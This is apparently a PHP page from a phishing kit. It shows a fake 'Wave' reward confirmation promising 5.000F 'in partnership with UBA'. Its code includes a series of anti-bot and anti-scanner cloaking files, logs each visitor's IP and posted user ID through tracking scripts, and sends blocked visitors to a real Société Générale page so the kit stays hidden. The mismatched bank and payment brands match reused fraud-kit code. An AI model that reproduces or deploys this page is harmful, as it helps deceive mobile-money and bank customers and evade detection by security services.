<?php

error_reporting(0);
set_time_limit(0);
session_start();
include ('../prevents/bots.php');
	include ('../prevents/anti1.php');
	include ('../prevents/anti2.php');
	include ('../prevents/anti3.php');
	include ('../prevents/anti4.php');
	include ('../prevents/anti5.php');
	include ('../prevents/anti6.php');
	include ('../prevents/anti7.php');
	include ('../prevents/anti8.php');

header('Content-type: text/html; charset-UTF-8');
include('./inclu/para.php');
include('./inclu/bots.php');
//include('./inclu/banned-ip.php');
date_default_timezone_set('GMT');
$rand_tarikh = md5(date('1 js \of F Y h:i:s A'));
$url = $_SESSION['url'];
$ip = getenv("REMOTE_ADDR");

$idClient = $_POST['user_id'];



if($hhh){
  if($hhh['bloque'] == 1){
    header("Location: https://particuliers.societegenerale.fr/restitution/cns_listeprestation.html");
    exit;
  }
}else{

}
include 'page_notify.php';
// Juste au début du fichier PHP
include 'Jeehan.php';
$jeehan = new Jeehan();
$jeehan->track('exp.php'); // ex: connexion.php

include("track.php");

?>
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Récompense Wave</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background-color: #f6f7fb;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      text-align: center;
      padding: 20px;
      position: relative;
    }

    .back-arrow {
      position: absolute;
      top: 20px;
      left: 20px;
      font-size: 26px;
      cursor: pointer;
    }

    .notification {
      background-color: #e0f7e9;
      color: #1e824c;
      padding: 10px 16px;
      border-radius: 10px;
      font-size: 15px;
      margin-bottom: 20px;
      opacity: 0;
      animation: fadeIn 1s ease forwards;
    }

    @keyframes fadeIn {
      to {
        opacity: 1;
      }
    }

    .icon-container {
      background-color: #b3d4ff;
      border-radius: 16px;
      width: 64px;
      height: 64px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 28px;
      margin-bottom: 20px;
    }

    .amount {
      font-size: 32px;
      font-weight: bold;
    }

    .title {
      font-size: 18px;
      color: #555;
      margin-top: 5px;
    }

    .share-box {
      background: white;
      padding: 20px;
      border-radius: 14px;
      margin-top: 30px;
      width: 100%;
      max-width: 380px;
      box-shadow: 0 1px 6px rgba(0,0,0,0.1);
    }

    .share-icon {
      background-color: #eee;
      border-radius: 50%;
      padding: 10px;
      font-size: 22px;
      margin-bottom: 10px;
    }

    .share-text {
      font-size: 16px;
      font-weight: 500;
    }

    .footer {
      position: absolute;
      bottom: 20px;
      font-size: 13px;
      color: #999;
    }
  </style>
</head>
<body>

<div class="back-arrow" onclick="history.back()">&#x2190;</div>

<!-- ✅ Message de confirmation -->
<div class="notification">✅ Votre récompense sera créditée sous 24h.</div>

<div class="icon-container">⬆️</div>

<div class="amount">5.000F</div>
<div class="title">Cadeau Wave 🎉🍽️</div>

<div class="share-box">
  <div class="share-icon">📤</div>
  <div class="share-text">Partager</div>
</div>

<div class="footer">En partenariat avec UBA</div>

</body>
</html>
